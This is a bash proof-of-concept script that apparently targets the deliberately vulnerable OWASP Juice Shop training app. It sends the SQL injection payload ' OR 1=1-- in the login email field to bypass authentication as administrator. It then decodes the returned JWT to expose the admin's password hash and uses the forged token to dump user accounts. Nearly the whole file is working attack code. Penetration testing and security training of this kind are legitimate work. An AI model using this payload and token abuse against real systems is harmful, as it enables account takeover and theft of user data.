#!/usr/bin/env bash
# PoC 2: SQL Injection -> Authentication Bypass as administrator
# Endpoint: POST /rest/user/login  (email field concatenated into SQL query)
#
# Payload `' OR 1=1--` terminates the string literal and neutralises the password
# check, so the query returns the first user row in the table (the admin).
# Result: a valid admin JWT. The JWT body also discloses the account's
# unsalted MD5 password hash (0192023a7bbd73250516f069df18b500 -> "admin123").
set -u
B="${1:-http://host.docker.internal:3000}"

echo "[*] Baseline: login with wrong password should fail"
curl -s -o /dev/null -w "    normal login -> HTTP %{http_code}\n" \
  -X POST "$B/rest/user/login" -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"not-the-password"}'

echo "[*] Attack: SQLi payload in email field"
RESP=$(curl -s -X POST "$B/rest/user/login" -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"whatever"}')
echo "$RESP" | head -c 200; echo " ..."

echo
echo "[*] Decoding returned JWT payload:"
echo "$RESP" | python3 -c '
import sys, json, base64
d = json.load(sys.stdin)["authentication"]
tok = d["token"]
print("    umail (authenticated as):", d["umail"], "| bid:", d["bid"])
p = tok.split(".")[1]
p += "=" * (-len(p) % 4)
claims = json.loads(base64.urlsafe_b64decode(p))
u = claims["data"]
print("    role  :", u["role"])
print("    email :", u["email"])
print("    pwhash:", u["password"], "(unsalted MD5)")
open("'$PWD'/poc2_admin.token","w").write(tok)
'
TOK=$(cat poc2_admin.token 2>/dev/null || cat "$(dirname "$0")/poc2_admin.token")
echo
echo "[*] Impact: using forged admin token to read the full user dump"
curl -s -H "Authorization: Bearer $TOK" "$B/api/Users/" | python3 -c '
import sys, json
rows = json.load(sys.stdin)["data"]
print("    accounts exposed:", len(rows))
for r in rows[:4]:
    print("    ", r["id"], r["email"], r["role"])
'
